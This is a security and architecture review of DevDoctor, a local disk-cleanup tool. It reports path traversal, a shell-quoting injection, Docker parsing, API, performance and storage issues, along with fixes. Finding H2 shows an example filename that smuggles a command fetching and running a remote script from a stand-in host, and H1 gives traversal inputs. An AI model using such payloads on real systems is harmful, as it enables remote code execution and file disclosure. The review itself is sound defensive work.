# DevDoctor — Security & Architecture Review

**Date:** 2026-08-23
**Scope:** Full repository — Python CLI/core (`src/diskdoctor`), FastAPI web backend (`src/diskdoctor/web`), React/Vite SPA (`web/src`), Electron shell (`web/electron`), and build/deploy tooling (`scripts/`, packaging config).
**Method:** Manual review of the security-critical execution paths (subprocess, web routes, Electron, CLI) plus four focused deep-dives across providers/memory, storage, and frontend/build. Every finding below was verified against the actual code; the two highest-impact items (Docker parsing, large-file recipe quoting) were confirmed by reproduction.

---

## 1. Executive summary

DevDoctor is a **local, single-user** developer-workstation tool: a loopback-bound web server plus CLI that discovers reclaimable disk caches and memory consumers and, on explicit confirmation, runs cleanup commands. Judged against that threat model, **the security fundamentals are genuinely good.** The parts that matter most — how shell commands get built and executed — are done right:

- **No shell is ever invoked.** Every command runs as an argv list through `subprocess.run` / `asyncio.create_subprocess_exec` with `shell=False` and `stdin=DEVNULL` (`ports.py`, `web/subprocess_stream.py`). Recipe paths are wrapped in `shlex.quote`.
- **The web clean path never trusts the client.** `POST /api/clean/jobs` re-scans server-side and only matches client-supplied *entry IDs* against freshly discovered entries — recipes are never taken from the request or from persisted data (`routes_clean.py`).
- **DNS-rebinding is mitigated** by a Host-header allow-list (`web/middleware.py`); the SPA talks to a **relative** `/api` base with JSON-only bodies, so cross-origin state changes hit a failing CORS preflight.
- **Electron is hardened**: `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`, and a `setWindowOpenHandler` that denies in-app navigation and routes links to the OS browser.
- YAML is always `safe_load`; there is no `pickle`/`eval`; SQL is fully parameterized; the directory sizer uses `os.walk` (not recursion) with symlink-safe, device-bounded, inode-deduped accounting.

The issues worth acting on fall into three buckets:

1. **A handful of real security gaps** — a path-traversal in snapshot loading, a hand-built shell-quoting bug in the large-files provider, an unauthenticated state-changing API, and a few trust-the-filesystem assumptions (LM Studio home pointer, YAML globs, stale-PID kill).
2. **A correctness bug that silently defeats a headline feature** — the Docker provider parses `docker system df` output in a format modern Docker no longer emits, so it reports *nothing* while tens of GB sit reclaimable.
3. **Performance costs that will bite as history/scan size grows** — per-poll full-file rewrites, an unvirtualized table, unbounded in-memory buffers, and SQLite connection/locking handling that will produce "database is locked" under the CLI+web concurrency the app already supports.

None of these are remotely exploitable in the ordinary sense — the attack surface is the local machine. But several convert "another local process / a lured browser tab / a crafted filename" into "delete files, kill processes, or read arbitrary JSON," which is worth closing for a tool whose whole job is destructive operations.

### Severity counts

| Severity | Count | Theme |
|---|---|---|
| High | 3 | Path traversal; recipe-quoting injection; Docker feature silently broken |
| Medium | 12 | Unauth API, path-accepting settings, filesystem-trust, CSP, storage/scan performance |
| Low | 13 | Perms, retention, memoization, build/CI hygiene |
| Info / positive | — | Solid execution model, verified non-issues |

---

## 2. High-severity findings

> **Update (2026-08-23):** All three high-severity findings below have been fixed
> in the same branch as this report. H1 adds a `_safe_component` guard to both
> filesystem snapshot loaders; H2 quotes the whole `echo` message with
> `shlex.quote`; H3 parses `docker system df` NDJSON keyed by `Type` (with a
> legacy fallback). Each fix ships with regression tests.

### H1 — Path traversal in snapshot loading (`storage/filesystem.py`)

`load_disk_snapshot` and `load_memory_snapshot` join a caller-supplied name straight onto the storage directory with no validation:

```python
# storage/filesystem.py:81
def load_disk_snapshot(self, name: str) -> Report:
    path = self.snapshot_dir() / name          # name unsanitized
    if not path.is_file():
        raise FileNotFoundError(name)
    return Report.from_json(path.read_text())
```

`pathlib` joins make `name="../../.."` escape the directory, and an **absolute** `name` replaces the base entirely (`Path(dir) / "/etc/x" == Path("/etc/x")`). This is reachable from HTTP **query parameters**, which — unlike the `/api/snapshots/{name}` path param — can contain `/` and `..`:

- `GET /api/diff?from_=<path>&to_=<path>` → `routes_history.py:80,89` → `load_disk_snapshot(from_)`
- `GET /api/memory/snapshots/diff?from_=<path>&to_=<path>` → `routes_memory.py:123` → `load_memory_snapshot(from_)` (forced `.json` suffix narrows it to `*.json` files)

Any file the user can read that parses as the expected JSON is returned to the caller; other paths yield a 500, giving a file-existence oracle. The server is loopback-only and unauthenticated (see M1), so the practical attacker is another local process or a lured browser tab — but this is the one genuine traversal primitive in the codebase.

**Fix:** reject names that aren't a single path component, e.g.
```python
if Path(name).name != name or name in (".", ".."):
    raise FileNotFoundError(name)
```
or resolve and assert `path.resolve().is_relative_to(self.snapshot_dir().resolve())`. Apply to both loaders.

### H2 — Hand-built shell quoting in `large_files` provider (`providers/large_files.py:88`)

The large-files provider assembles an advice recipe by interpolating the **raw, unquoted** path into a single-quoted `echo`:

```python
msg = f"Large file at {path_str} ({_human(size)}). ... delete with: rm {quoted}. ..."
recipe=[f"echo '{msg}'"]          # path_str is NOT quoted; only `quoted` is
```

Because `path_str` is inserted verbatim between single quotes, any apostrophe in a filename breaks the quoting. Two consequences:

- **Cleanup crashes on ordinary files.** A file named `John's Movie.mov` (common on macOS) produces `echo 'Large file at .../John's Movie.mov ...'` — an unbalanced quote. When that entry is cleaned, `shlex.split(line)` raises `ValueError: No closing quotation`, which is uncaught in `cleanup.run` (`cleanup.py:228`) and in `run_line_streaming` (`subprocess_stream.py:27`), aborting the whole job.
- **Injection into the reviewed cleanup script.** `build_script` (`cleanup.py:293`, exposed via `POST /api/recipe` and `diskdoctor recipe`) embeds these lines into a bash script the user is instructed to uncomment and run. A ≥500 MB file planted in `~/Desktop`/`~/Documents`/`~/Movies`/`~/Pictures` with a name like `x'$(curl evil|sh)'.iso` places `$(...)` outside the single quotes, so it executes when the user runs the uncommented line. Requires attacker file-placement plus the user running the script, but it is a real command-injection path in the primary "review a script" workflow.

**Fix:** never hand-assemble quoting. Emit `f"echo {shlex.quote(msg)}"` (quoting the whole message), or better make advice a non-executable field rather than an `echo` recipe. Audit `build_script` to guarantee every emitted line is fully `shlex.quote`d.

### H3 — Docker provider silently reports nothing (`providers/docker.py:38`)

```python
result = self._shell.run(["docker", "system", "df", "--format", "json"], ...)
data = json.loads(result.stdout)          # expects {"Images":[...], "Containers":[...], ...}
```

Modern Docker CLI emits `docker system df --format json` as **NDJSON** — one object per line keyed by `Type` (verified on Docker 29.3.1: `{"Reclaimable":"20.8GB (51%)","Type":"Images"}` × 4 lines). A single `json.loads` over multi-line input raises `JSONDecodeError`, which is swallowed (`return []`). The provider therefore reports **nothing**, hiding tens of GB of reclaimable Docker space on any host with a current Docker. Even if it parsed, the expected keys (`Images`/`Containers`/`Volumes`/`BuildCache`) don't match the real `Type` values (`Local Volumes`, `Build Cache`).

**Fix:** parse line-wise (`for line in stdout.splitlines(): obj = json.loads(line)`), dispatch on the `Type` field, and **log/record parse failures** instead of silently returning `[]` (see A2). Add a regression test with real NDJSON fixture output.

---

## 3. Medium-severity findings

> **Update (2026-08-23):** The threat model was clarified — DevDoctor is a local,
> single-user dev tool, so findings whose only harm requires a remote or
> cross-user attacker (M1, M3, and the security angles of M2/M4/M7) are accepted
> as-is. A "fix now" tier of the threat-model-independent issues has since been
> implemented with tests: **M5** (kill re-validates the PID still maps to the
> shown process), **M7b** (browser opens only after the server answers),
> **P1** (per-poll observation reads/rewrites are now O(1) / amortized),
> **P3** (cleanup console buffer capped), **P4+L2** (SQLite WAL + `busy_timeout`),
> **A4** (microsecond snapshot names — no same-second clobber), and **L10**
> (treemap tiles navigate via the SPA router). The remaining items below stand
> as future work.

### Security

**M1 — State-changing API is unauthenticated.** `POST /api/clean/jobs` (deletes files), `POST /api/memory/actions` (kills processes / quits apps), and `PATCH /api/settings` carry no auth token or CSRF token (`api/client.ts`). Protection rests entirely on loopback binding + the Host-header allow-list + absent CORS. That is a *reasonable* localhost posture and the JSON content-type forces a preflight for cross-origin callers — but any other local process, or any browser context that can present an allowed Host value, can drive destructive actions. **Fix:** mint a per-launch session token in `serve`, hand it to the SPA at load, and require it on state-changing routes; keep the Host allow-list tight (it currently is). At minimum, document the trust model explicitly.

**M2 — `PATCH /api/settings` accepts arbitrary paths.** `data_dir`/`sqlite_path` are taken verbatim (`config._path_value` even runs `expanduser()`), then `SQLiteStorage.__init__` does `mkdir(parents=True)` and creates a DB there, and `import_filesystem` reads from the given `data_dir` (`routes_settings.py:29`). Combined with H1's read primitive, this lets a local caller create files/dirs anywhere the user can write and re-point storage. **Fix:** confine paths to `$HOME`/XDG dirs (or require explicit confirmation), and validate before `mkdir`.

**M3 — LM Studio home-pointer file is fully trusted (`providers/lm_studio.py:59`).** `_resolve_home()` reads `~/.lmstudio-home-pointer`, expanduser-expands its contents, and treats the result as the base directory whose subtrees become `rm -rf` recipes. Any process that can write that dotfile can redirect scans — and destructive recipes — at an arbitrary directory. **Fix:** resolve the target and verify it is a directory under `$HOME` (or an allow-list); reject absolute/system paths.

**M4 — YAML glob entries delete through symlinks (`providers/base.py:172`).** Globbed `paths.yaml` entries (e.g. `~/Library/Caches/Google/Chrome/*/Cache`) expand via `glob.glob`; each match becomes `rm -rf {path}`. `p.exists()` follows symlinks and there is no device/symlink guard (unlike `venv.py`/`large_files.py`), so a symlinked match causes `rm -rf` of the link target. **Fix:** `lstat` each match, skip symlinks (or resolve and confirm on-device containment) before emitting a destructive recipe.

**M5 — Process-kill uses a possibly-stale PID (`memory/actions.py:103`).** `POST /api/memory/actions` sends `kill -TERM <pid>` for any `pid > 1`. The PID comes from a scan the UI may be holding for seconds/minutes; the OS can recycle it onto an unrelated process in the interim, and the only guard is `pid > 1`. **Fix:** re-collect the process table and re-validate the PID still maps to the command shown to the user (by name/start-time) before signaling.

**M6 — No Content-Security-Policy on the Electron renderer (`web/electron/main.mjs`).** `webPreferences` are hardened, but there is no CSP (no meta tag, no `onHeadersReceived`). The renderer displays arbitrary filesystem-derived strings (paths, process cmdlines, error text); React auto-escaping is the only XSS barrier. **Fix:** add `default-src 'self'; script-src 'self'` via a `<meta http-equiv>` in `index.html` and/or `session.defaultSession.webRequest.onHeadersReceived`. Pure defense-in-depth.

**M7 — Free-port TOCTOU and browser opened before bind (`cli.py:31,279`).** `_pick_free_port` binds port 0, closes the socket, and uvicorn re-binds later; `webbrowser.open(url)` runs *before* `uvicorn.run`. A local process can grab the port in the gap, and the just-opened browser renders the attacker's page at the trusted URL. **Fix:** bind the listening socket once and hand its fd to uvicorn (`Server.serve(sockets=[s])`); open the browser from a startup callback after bind.

### Performance

**P1 — Every `GET /api/memory` poll rewrites the whole observations file (`storage/filesystem.py:226` + `routes_memory.py:65`).** `_should_record_memory` calls `list_memory_observations(limit=1)`, which deserializes *every* line just to read the newest timestamp; on record it then `prune_memory_observations(keep=2000)` re-reads all 2000 and rewrites the file. The dashboard polls this endpoint, so steady state is O(file) read + O(file) write of a multi-MB JSONL per poll. **Fix:** track the newest timestamp in memory/sidecar, prune occasionally (every Nth write or on line-count overflow), and stream-parse only the meta fields.

**P2 — `CacheTable` renders all rows unvirtualized (`web/src/components/CacheTable.tsx:150`).** A scan can yield thousands of entries and "show hidden rows" dumps the full set. `@tanstack/react-virtual` is a declared dependency but is imported nowhere — the intended virtualization was never wired up. **Fix:** use `useVirtualizer` for the row list.

**P3 — Unbounded `consoleLines` growth per cleanup entry (`web/src/hooks/useCleanupWizard.ts:65`).** Every stdout/stderr chunk is appended (`[...prev.consoleLines, chunk]`) with no cap, retained for the whole job, while only the last line is ever displayed. **Fix:** keep only the last N lines.

**P4 — SQLite: connection-per-op, no WAL/busy_timeout (`storage/sqlite.py:522`).** `_connect()` opens a fresh connection each call; `with conn` commits but does **not** close (relies on refcounting). No `journal_mode=WAL`, `busy_timeout`, or `foreign_keys`. Because the CLI and web server can both write the same DB, concurrent access will hit `database is locked`. **Fix:** one connection (or small pool) per `SQLiteStorage`, `PRAGMA journal_mode=WAL; PRAGMA busy_timeout=5000` on connect, explicit close.

**P5 — Listing parses every snapshot file (`storage/filesystem.py:59`).** `list_disk_snapshots` runs `Report.from_json(read_text())` on every snapshot just for metadata (used by `/api/snapshots`, `/api/history` with `limit=None`, and pruning). **Fix:** write a small per-snapshot sidecar meta file (or an index) so listings don't parse full reports.

**P6 — `import_filesystem` is O(n²) (`storage/sqlite.py:297`).** For every imported snapshot it calls `len(list_disk_snapshots(limit=None))` twice and materializes the entire audit history as a set of JSON strings. **Fix:** `INSERT ... ON CONFLICT DO NOTHING` + `rowcount`, and dedupe events via a hash column.

**P7 — Overlapping, serial tree walks across providers (`sizer.py` + providers).** `discovery.scan` runs providers serially with no cross-provider caching; `lm_studio._scan_hub` and `huggingface` independently walk the same HF cache. On large model/HF caches this walking is the dominant scan cost. **Fix:** share a process-wide inode cache across providers (the sizer docstring already anticipates this) and/or parallelize discovery.

---

## 4. Low-severity findings

| ID | Location | Issue | Fix |
|---|---|---|---|
| L1 | `storage/filesystem.py`, `sqlite.py:122`, `history_log.py` | Stored data (snapshots with home paths + hostname, audit log with executed commands/stderr, DB, config) created with default umask — readable by other local users | `mkdir(mode=0o700)`, create files `0o600` |
| L2 | `storage/sqlite.py:60,260` | `audit_events` grows unbounded (filesystem backend rotates at 5 MB × 4; SQLite has no retention) | Add age/count retention DELETE |
| L3 | `storage/sqlite.py:210,412` | Prune fetches all ids into Python then `executemany` | Single `DELETE ... WHERE name NOT IN (SELECT ... LIMIT ?)` |
| L4 | `providers/base.py:176` | `os.path.expandvars` on YAML paths interpolates env vars into `rm -rf` targets (matters with `DISKDOCTOR_PATHS_YAML` override) | Drop `expandvars` or document override as trusted-only |
| L5 | `memory/collectors/processes.py:114` | `classify_process` uses naive substring match (`chrome`/`llama`/`electron`/`docker`) → misclassification skews advisor totals | Match on basename with word boundaries |
| L6 | `scripts/deploy.sh:143` | Replays a `ps`-captured cmdline through `bash -c`, re-applying word-splitting/globbing | Relaunch from a fixed known invocation |
| L7 | `web/package.json:34,45` | `tailwindcss`/`@tailwindcss/vite` manifest floor is `^4.0.0-alpha.20` (lockfile resolves stable 4.2.2) | Bump ranges to `^4.2.0` |
| L8 | `.pre-commit-config.yaml`, no `.github/` | No frontend lint/typecheck gate and no CI at all | Add a `npm run typecheck` hook + a CI workflow |
| L9 | `storage/filesystem.py:90,162`, `config.py:74` | Fixed `*.tmp` filenames — two concurrent writers can publish a truncated file; `prune` read-modify-write drops concurrently-appended observations | `tempfile.NamedTemporaryFile(dir=...)` + `fcntl.flock` around prune |
| L10 | `web/src/components/MosaicTreemap.tsx:134` | Raw `<a href>` inside SVG triggers a full document reload instead of SPA navigation (hrefs are safely `encodeURIComponent`d — UX, not security) | Intercept click → `useNavigate` |
| L11 | `web/src/hooks/useSSE.ts:35` | Unbounded `events` accumulation + effect re-subscribe on array identity (latent — no consumers yet) | Bound buffer, memoize `eventNames` when adopted |
| L12 | `web/src/pages/Scan.tsx:86`, `CacheTable.tsx:164` | Handlers/rows not memoized → whole table re-renders on any parent state change (compounds P2) | `useCallback` + `React.memo` |
| L13 | `web/routes_scan.py:43` | `GET /api/scan?snapshot=true` performs writes on a GET (non-idempotent, CSRF-able side effect; low harm) | Move snapshot-writing to a POST |

---

## 5. Architecture observations

- **A1 — SQLite migration scaffolding is inert (`storage/sqlite.py:35,514`).** `_SCHEMA_VERSION = 2` and a `schema_migrations` table exist, but `_ensure_schema` only runs `CREATE TABLE IF NOT EXISTS` + `INSERT OR IGNORE version 2` — it never reads the recorded version or applies stepwise upgrades, and would stamp "2 applied" onto a v1 DB whose tables were never altered. Any future column change silently breaks existing DBs. Adopt read-`MAX(version)` → apply ordered migrations in a transaction → record each version, before the schema next changes.
- **A2 — Pervasive silent error-swallowing.** Corrupt `config.json` falls back to defaults with no warning (a typo silently flips the storage backend); unreadable snapshots are skipped with bare `except Exception: continue`; audit-write failures are swallowed (`cleanup_runner.py:141`) — so the audit log, whose purpose is accountability, fails silently; `docker.py`/`lm_studio.py`/`huggingface.py` map errors to empty results, making "permission denied" indistinguishable from "nothing to clean." There is no `logging` logger anywhere in the storage or provider layers. Introduce structured logging and thread a "skipped/diagnostics" channel into the report so the UI can show degraded state. This directly underlies H3.
- **A3 — Storage backend coupling.** `sqlite.py` imports underscore-private helpers from `filesystem.py` (`_memory_observation_meta`, etc.) and duplicates `_memory_observation_id`; `import_filesystem` lives outside the `StorageBackend` protocol, forcing `isinstance` checks in the settings route. Move shared meta-builders to `storage/base.py` (or `_common.py`) and model migration as a standalone `migrate(src, dst)` or an `Importable` protocol.
- **A4 — Second-precision snapshot names silently overwrite (`history.py:17`, `sqlite.py:132`).** Two disk snapshots in the same second collide; both `INSERT OR REPLACE` and filesystem `os.replace` clobber the earlier one with no error (memory observations avoid this with a uuid suffix). Add microseconds or a short uuid suffix.
- **A5 — `ports.py` naming.** Despite the name, `ports.py` is the subprocess `Shell` abstraction, not networking; port selection lives in `cli.py`. Minor, but the name invites confusion in a review.

---

## 6. Verified non-issues (defenses that hold)

These were checked and found **correct** — worth recording so they aren't re-flagged:

- **No shell injection in execution.** `shlex.split` + `create_subprocess_exec`/`subprocess.run`, `shell=False`, `stdin=DEVNULL` everywhere (`ports.py:29`, `subprocess_stream.py:27`).
- **Web cleanup never trusts client recipes** — server re-scans and matches entry IDs only (`routes_clean.py:23`); dangerous-risk entries require explicit `--allow-dangerous` (`cleanup.py:126`).
- **SQL is fully parameterized** — the f-strings in `sqlite.py` interpolate only constant `WHERE`/`LIMIT` fragments; all values pass as `?` params.
- **No `pickle` / `eval`**; YAML is always `yaml.safe_load`.
- **No `dangerouslySetInnerHTML` / `innerHTML` / `eval`** in the SPA; all backend-derived strings render as escaped JSX text. `localStorage` reads are validated + try/caught. URL construction uses `encodeURIComponent`/`URLSearchParams`. SVG `clipId` is sanitized; `ProviderIcon` renders only bundled constant path data.
- **Electron packaging is sound** — `check-backend-bundle.mjs` fails the pack if the backend binary is missing/non-executable; `build_backend.py` and `generate_app_icon.py` shell out only via argv lists; no `curl | bash`, no hardcoded secrets in any script.
- **Sizer is well-built** — `os.walk` (no recursion), `followlinks=False`, device-scoped, inode-deduped, `st_blocks`-accurate; `venv`/`large_files` walks are depth-capped and device-guarded.

---

## 7. Suggested remediation order

**Do first (small, high-value):**
1. H1 — sanitize snapshot names in both loaders (a few lines; closes the traversal).
2. H2 — fix `large_files` recipe quoting (`shlex.quote` the whole message); audit `build_script`.
3. H3 — parse Docker NDJSON + dispatch on `Type`; add a fixture test. Restores a headline feature.

**Do next (contained, meaningful):**
4. M2 + M1 — validate settings paths; add a per-launch session token for state-changing routes.
5. P4 — SQLite WAL + `busy_timeout` + connection lifetime (prevents `database is locked` the app can already trigger).
6. P1 — stop rewriting the observations file on every poll.
7. M3 / M4 / M5 — filesystem-trust hardening (LM Studio pointer, glob symlinks, stale-PID re-validation).

**Hygiene / larger:**
8. A2 — introduce logging + a diagnostics channel (unblocks confident fixes elsewhere).
9. P2 / P3 / L12 — wire up virtualization, cap buffers, memoize.
10. A1 — a real migration path before the SQLite schema changes again.
11. L1 / L2 / L8 — file permissions, SQLite retention, a CI + frontend pre-commit gate.

---

*Findings were validated against the code at commit `09d5ced`. Line numbers refer to that revision and may drift as the code evolves.*
